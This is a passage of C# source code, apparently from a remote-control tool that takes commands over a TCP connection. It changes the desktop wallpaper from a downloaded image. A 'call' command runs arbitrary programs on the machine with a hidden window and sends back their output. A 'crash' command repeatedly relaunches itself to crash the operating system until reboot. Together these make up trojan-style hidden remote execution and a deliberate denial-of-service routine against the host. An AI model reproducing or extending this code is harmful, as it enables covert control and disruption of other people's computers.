                {
                    string uri = args[Array.IndexOf<string>(args, "-u") + 0x1].Replace('/', '\\');
                    string extension = uri.Split('\\')[uri.Split('\\').Length - 1];
                    System.IO.Stream s = new System.Net.WebClient().OpenRead(uri);
                    System.Drawing.Image img = System.Drawing.Image.FromStream(s);
                    string tempPath = IO.Path.Combine(IO.Path.GetTempPath(), "wallpaper." + extension);
                    img.Save(tempPath);
                    img.Dispose();
                    s.Close();
                    s.Dispose();
                }
                else if (arg.Contains("-f"))
                    file_path = args[Array.IndexOf<string>(args, "-f") + 0x1].Replace('/', '\\');
                else
                    return "bad filename";

                if (arg.Contains("-t"))
                    type = (other.DesktopBackgroundChange.Style)int.Parse(args[Array.IndexOf<string>(args, "-t") + 0x1]);
                else
                    type = other.DesktopBackgroundChange.Style.Stretched;

                try
                {
                    other.DesktopBackgroundChange.Set(file_path, type);
                    return "ok!";
                }
                catch (Exception ex)
                {
                    return "error\n" + ex.ToString();
                }
            }
        }

        private static class SpecialPathes
        {
            public const string DATA = "%data%";
            public readonly static string DATA_PATH = Program.FilesFolder;
            public const string SYSTEM = "%system%";
            public readonly static string SYSTEM_PATH = Environment.GetFolderPath(Environment.SpecialFolder.System);
            public const string MY_DOCUMENTS = "%my documents%";
            public readonly static string MY_DOCUMENTS_PATH = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            public const string DESKTOP = "%desktop%";
            public readonly static string DESKTOP_PATH = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            public static bool replace(ref string path)
            {
                if (rep(ref path, DATA, DATA_PATH)) return true;
                if (rep(ref path, SYSTEM, SYSTEM_PATH)) return true;
                if (rep(ref path, MY_DOCUMENTS, MY_DOCUMENTS_PATH)) return true;
                if (rep(ref path, DESKTOP, DESKTOP_PATH)) return true;

                // .............
                return false;
            }

            private static bool rep(ref string path, string replace, string Path)
            {
                if (path.Split('\\')[0] == replace)
                {
                    path = path.Replace(replace + '\\', Path);
                    return true;
                }
                if (path.Split('/')[0] == replace)
                {
                    path = path.Replace(replace + '/', Path);
                    return true;
                }
                return false;
            }
        }

        #region run file on comp

        private const string CALL_COMMAND = "call";

        private static string CallFromUser(string name, string args)
        {
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = name;
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.Arguments = args;
            p.Start();
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            p.Dispose();
            return output;
        }

        private static string CallFile(string name, string args, FileLocation location)
        {
            string folder = "";
            switch (location)
            {
                case FileLocation.SameLocation: folder = CurrentFolder; break;
                case FileLocation.Default: folder = Program.FilesFolder; break;
            }
            if (!IO.Directory.Exists(folder))
                IO.Directory.CreateDirectory(folder);
            string[] files = IO.Directory.GetFiles(folder, name + ".*");
            string file = files[0];
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = file;
            p.StartInfo.Arguments = args;
            p.Start();
            string output = p.StandardOutput.ReadToEnd();
            
            p.WaitForExit();
            p.Dispose();
            return output;
        }

        private enum FileLocation
        {
            SameLocation = 0,
            Default
        }

        #endregion run file on comp

        #region os crash

        private const string CRASH_COMMAND = "crash";

        private static string CrashOS()
        {
            TCPServer.Send("are you sure? this will crash the os until next reboot\nenter 1 if sure:");
            if (TCPServer.ReciveString(10)[0] == '1')
            {
                TCPServer.Send("OK, crash!!!");
                Process.Start(System.Windows.Forms.Application.ExecutablePath, "crash");
                Process.Start(System.Windows.Forms.Application.ExecutablePath, "crash");
                System.Windows.Forms.Application.Exit();
                return "...";
            }
            return "canceled";
        }

        #endregion os crash

        private static string ConvertPath(string Path)
        {
            string path = Path;
            if (path[0] == '\\')
                return CurrentFolder.Substring(0, 2) + path.Substring(1);
            if (SpecialPathes.replace(ref path))
                return path;
            if (path.Length < 2 || path[1] != ':')
                return CurrentFolder + path;

            return path;
        }
    }
}